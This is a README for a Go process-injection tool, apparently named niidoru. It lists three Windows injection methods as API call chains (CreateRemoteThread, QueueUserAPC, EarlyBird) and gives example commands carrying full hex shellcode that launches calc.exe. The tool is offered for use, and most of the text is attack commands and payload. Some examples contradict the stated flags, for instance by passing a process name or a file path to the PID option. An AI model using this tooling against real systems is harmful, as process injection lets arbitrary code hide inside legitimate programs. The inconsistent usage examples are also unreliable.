# niidoru

Framework for Process Injection using Go.

```
go run . -m <METHOD> [ -p <PID> | -n <PROCESS_NAME> ] [ -h HEXADECIMAL_PAYLOAD ]
```
- -m (Mandatory): Process injection method. Options: 1, 2, 3

- -p (Optional):  Process ID or PID. Examples: 1234

- -n (Optional):  Process name. Example: notepad.exe

- -h (Optional):  Hexadecimal payload. It can be in the format "\x50\x51\x52" or "505152". Default: Payload to pop calc.exe 

------------------------------

## Methods

**Method 1** (*-m 1*) or **CreateRemoteThread**: 

```
OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread + CloseHandle
```

**Method 2** (*-m 2*) or **QueueUserAPC**: 

```
OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC + CloseHandle
```

**Method 3** (*-m 3*) or **EarlyBird**: 

```
CreateProcess + VirtualAllocEx + WriteProcessMemory + VirtualProtectEx + QueueUserAPC + ResumeThread + CloseHandle
```

------------------------------

## Examples:

Process injection using CreateRemoteThread method, targeting a notepad.exe process and with a payload in hexadecimal format with "\x":  

```
go run . -m 1 -p notepad.exe -h \x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x83\xEC\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4\x30\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3
```

Process injection using QueueUserAPC method, targeting a process with PID 1234 and with a payload in hexadecimal format without "\x":

```
go run . -m 2 -p 1234 -h 505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3
```

Process injection using EarlyBird method, spawning a new notepad.exe process and with the default payload:

```
go run . -m 3 -p c:\windows\system32\notepad.exe 
```

------------------------------

## Binary

Compile:

```
go build
```

Run:

``` 
niidoru.exe -m <METHOD> [ -p <PID> | -n <PROCESS_NAME> ] [ -h HEXADECIMAL_PAYLOAD ]
```



